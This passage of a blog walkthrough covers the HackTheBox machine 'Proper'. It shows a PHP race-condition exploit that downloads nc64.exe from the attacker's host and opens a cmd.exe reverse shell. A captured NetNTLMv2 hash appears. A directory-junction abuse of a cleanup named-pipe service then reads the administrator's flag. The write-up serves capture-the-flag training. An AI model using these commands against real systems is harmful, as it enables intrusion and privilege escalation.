+<h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><p>Once we have the ability to execute PHP code remotely, we can devise a<br>way to get a reverse shell. I’m going with transfering nc64.exe over to one<br>of the world-writable folders in Windows and run a reverse shell back to<br>me like so.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># ./race.sh &#x27;&lt;?php system(&quot;cmd /c powershell iwr http://10.10.14.2/nc64.exe -outf \windows\system32\spool\drivers\color\luci.exe&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># ./read.sh &#x27;//10.10.14.2/evil&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.231 - - [08/May/2021 06:04:12] <span class="string">&quot;GET /nc64.exe HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># python3 smbserver.py -username web -password &#x27;charlotte123!&#x27; -ip 10.10.14.2 -smb2support evil .</span></span><br><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.231,49695)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:9c5bcc7592dad9a6dba774008c3fbee4:010100000000000080f76974f143d701e6d79d4441e58a220000000001001000470055007500720077004100560056000300100047005500750072007700410056005600020010006e00530065004700490050004c007000040010006e00530065004700490050004c0070000700080080f76974f143d70106000400020000000800300030000000000000000000000000200000fc57632431f7c4e4274794844a744c0e6d27514eb5ddfad885de1bc2cb9a82d40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000</span><br><span class="line">[*] Connecting Share(1:IPC$)</span><br><span class="line">[*] Connecting Share(2:EVIL)</span><br><span class="line">[*] Disconnecting Share(1:IPC$)</span><br><span class="line">[*] Disconnecting Share(2:EVIL)</span><br><span class="line">[*] Closing down connection (10.10.10.231,49695)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure>
+
+<p>And then run the reverse shell with nc64.exe.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># ./race.sh &#x27;&lt;?php system(&quot;cmd /c start \windows\system32\spool\drivers\color\luci.exe 10.10.14.2 1234 -e cmd.exe&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># ./read.sh &#x27;//10.10.14.2/evil&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Voila!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvp 1234                                                                                                                                  </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 10.10.10.231.</span><br><span class="line">Ncat: Connection from 10.10.10.231:49751.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1728]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\licenses&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">proper\web</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\licenses&gt;<span class="built_in">cd</span> \<span class="built_in">users</span>\web\desktop</span><br><span class="line"><span class="built_in">cd</span> \<span class="built_in">users</span>\web\desktop</span><br><span class="line"></span><br><span class="line">C:\Users\web\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">3344dc2e5316dd94b0547eb967a1a1ea</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1954.jpg"></li>
+</ul>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>During enumeration of web’s account, I notice the presence of Cleanup<br>folder in C:\Program Files and in it, three files.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Cleanup&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is FE0C-A36B</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files\Cleanup</span><br><span class="line"></span><br><span class="line">11/15/2020  05:05 AM    &lt;DIR&gt;          .</span><br><span class="line">11/15/2020  05:05 AM    &lt;DIR&gt;          ..</span><br><span class="line">11/15/2020  05:03 AM         2,999,808 client.exe</span><br><span class="line">11/15/2020  10:22 AM               174 README.md</span><br><span class="line">11/15/2020  06:20 AM         3,041,792 server.exe</span><br><span class="line">               3 File(s)      6,041,774 bytes</span><br><span class="line">               2 Dir(s)   7,343,374,336 bytes free</span><br></pre></td></tr></table></figure>
+
+<p>There’s also a Cleanup folder in C:\ProgramData with no files in it.</p>
+<h3 id="Reversing-client-exe-and-server-exe"><a href="#Reversing-client-exe-and-server-exe" class="headerlink" title="Reversing client.exe and server.exe"></a>Reversing client.exe and server.exe</h3><p>Turns out both binaries are PE executables built with Golang, with the tell-<br>tale sign of an unusually large size for a PE executable and this.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1955.jpg"></li>
+</ul>
+<h3 id="Analysis-of-client-exe"><a href="#Analysis-of-client-exe" class="headerlink" title="Analysis of client.exe"></a>Analysis of client.exe</h3><p>Reverse engineering of client.exe shows the need to supply an argument<br>in order to “make it do something”.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1956.jpg"></li>
+</ul>
+<p>You can see from above that by supplying a -R and a file path triggers the<br>main_serviceRestore function which in turn calls upon a named pipe<br>client to connect to a named pipe, cleanupPipe.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1957.jpg"></li>
+</ul>
+<p>Further down the control flow graph, this is what’s actually sent across the<br>named pipe.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1958.jpg"></li>
+</ul>
+<h3 id="Analysis-of-server-exe"><a href="#Analysis-of-server-exe" class="headerlink" title="Analysis of server.exe"></a>Analysis of server.exe</h3><p>Suppose we replicate the behaviors of client.exe and server.exe in a<br>Windows 10 installation. This is what we have determined above.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1959.jpg"></li>
+</ul>
+<p>This is what’s displayed in server.exe.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1960.jpg"></li>
+</ul>
+<p>Hmm, where have I seen C:\ProgramData\Cleanup before? By the way,<br>dGVzdA&#x3D;&#x3D; is the base64-encoded string of test. On top of that, this is<br>evidence that a named pipe, cleanupPipe is listening for data.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1961.jpg"></li>
+</ul>
+<p>We can send our own data to server.exe with good ol’ command prompt<br>using the echo command like so.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1962.jpg"></li>
+</ul>
+<p>Meanwhile in server.exe, I see this…</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1963.jpg"></li>
+</ul>
+<p>Something’s not right. One character is truncated. In any case, all I have to<br>do is to add one more character behind the path. Well, this is what<br>happened. CLEAN removes the file specified in the file path and move it to<br>C:\ProgramData\Cleanup&lt;base64-encoded file path&gt; and its content<br>encrypted with AES-GCM.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1964.jpg"></li>
+</ul>
+<p>Conversely, RESTORE restores the file back to the original file path by<br>decrypting the file contents and decoding the file path.</p>
+<h3 id="Getting-root-txt"><a href="#Getting-root-txt" class="headerlink" title="Getting root.txt"></a>Getting root.txt</h3><p>This gives me an idea. What if we create a symbolic link to C:\Users<br>\Administrator\Desktop, do a CLEAN on that symbolic link + root.txt.<br>This will back up the file at C:\ProgramData\Cleanup. Remove the link and<br>create a real folder and then do a RESTORE. Maybe RESTORE will do us a<br>favor and write the contents of root.txt to that folder and we can simply<br>read the file?</p>
+<h3 id="Create-directory-junction"><a href="#Create-directory-junction" class="headerlink" title="Create directory junction"></a>Create directory junction</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\web\Downloads&gt;mklink /j dipshit \<span class="built_in">users</span>\administrator\desktop</span><br><span class="line">mklink /j dipshit \<span class="built_in">users</span>\administrator\desktop</span><br><span class="line">Junction created <span class="keyword">for</span> dipshit &lt;&lt;===&gt;&gt; \<span class="built_in">users</span>\administrator\desktop</span><br><span class="line"></span><br><span class="line">C:\Users\web\Downloads&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is FE0C-A36B</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\web\Downloads</span><br><span class="line"></span><br><span class="line">05/08/2021  02:52 AM    &lt;DIR&gt;          .</span><br><span class="line">05/08/2021  02:52 AM    &lt;DIR&gt;          ..</span><br><span class="line">05/08/2021  02:52 AM    &lt;JUNCTION&gt;     dipshit [C:\<span class="built_in">users</span>\administrator\desktop]</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)   7,342,006,272 bytes free</span><br></pre></td></tr></table></figure>
+
+<h3 id="CLEAN"><a href="#CLEAN" class="headerlink" title="CLEAN"></a>CLEAN</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\web\Downloads&gt;<span class="built_in">echo</span> CLEAN \<span class="built_in">users</span>\web\Downloads\dipshit\root.txtx &gt; \\.\pipe\cleanupPipe</span><br><span class="line"><span class="built_in">echo</span> CLEAN \<span class="built_in">users</span>\web\Downloads\dipshit\root.txtx &gt; \\.\pipe\cleanupPipe</span><br><span class="line"></span><br><span class="line">C:\Users\web\Downloads&gt;<span class="built_in">dir</span> \programdata\cleanup</span><br><span class="line"><span class="built_in">dir</span> \programdata\cleanup</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is FE0C-A36B</span><br><span class="line"></span><br><span class="line"> Directory of C:\programdata\cleanup</span><br><span class="line"></span><br><span class="line">05/08/2021  02:53 AM    &lt;DIR&gt;          .</span><br><span class="line">05/08/2021  02:53 AM    &lt;DIR&gt;          ..</span><br><span class="line">05/08/2021  02:53 AM               192 XHVzZXJzXHdlYlxEb3dubG9hZHNcZGlwc2hpdFxyb290LnR4dA==</span><br><span class="line">               1 File(s)            192 bytes</span><br><span class="line">               2 Dir(s)   7,342,006,272 bytes free</span><br></pre></td></tr></table></figure>
+
+<h3 id="Remove-directory-junction-and-create-a-real-folder"><a href="#Remove-directory-junction-and-create-a-real-folder" class="headerlink" title="Remove directory junction and create a real folder"></a>Remove directory junction and create a real folder</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\web\Downloads&gt;<span class="built_in">rmdir</span> dipshit</span><br><span class="line"><span class="built_in">rmdir</span> dipshit</span><br><span class="line"></span><br><span class="line">C:\Users\web\Downloads&gt;<span class="built_in">mkdir</span> dipshit</span><br><span class="line"><span class="built_in">mkdir</span> dipshit</span><br></pre></td></tr></table></figure>
+
+<h3 id="RESTORE"><a href="#RESTORE" class="headerlink" title="RESTORE"></a>RESTORE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\web\Downloads&gt;<span class="built_in">echo</span> RESTORE \<span class="built_in">users</span>\web\Downloads\dipshit\root.txtx &gt; \\.\pipe\cleanupPipe</span><br><span class="line"><span class="built_in">echo</span> RESTORE \<span class="built_in">users</span>\web\Downloads\dipshit\root.txtx &gt; \\.\pipe\cleanupPipe</span><br><span class="line"></span><br><span class="line">C:\Users\web\Downloads&gt;<span class="built_in">type</span> dipshit\root.txt</span><br><span class="line"><span class="built_in">type</span> dipshit\root.txt</span><br><span class="line">a8393e214a40d2e28d5eff5504022ca1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1965.jpg"></li>
+</ul>
+<h3 id="Afterthought"><a href="#Afterthought" class="headerlink" title="Afterthought"></a>Afterthought</h3><p>One of the creators of Proper told me that privilege escalation is possible<br>from an arbitrary file write. Indeed, <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhaWxheTE5OTYvV2VyVHJpZ2dlcg==">WerTrigger<i class="fa fa-external-link-alt"></i></span> is one such local privilege<br>escalation exploit weaponizing arbitrary file writes using Windows problem<br>reporting framework among others such as UsoDLLLoader and DiagHub.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1966.jpg"></li>
+</ul>
+<p>And there you have it.</p>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>John crack with salt</li>
+<li>self write sqlmap tamper script to get data</li>
+<li>Remote File Inclusion via SMB share</li>
+<li>Race Condition to get code excecution</li>
+<li>john crack netntlmv2 hash</li>
+<li>Privilege Escalation via reversing .exe file</li>
+<li>use WerTrigger for arbitrary file write using Windows problem reporting framework among others such as UsoDLLLoader and DiagHub.</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/05/08/proper/" title="Hack-The-Box-walkthrough[proper]">https://fdlucifer.github.io/2021/05/08/proper/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/03/love/" rel="prev" title="Hack-The-Box-walkthrough[Love]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Love]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/08/pwn-restaurant/" rel="next" title="Hack-The-Box-pwn-challenge[restaurant]">
+                  Hack-The-Box-pwn-challenge[restaurant] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
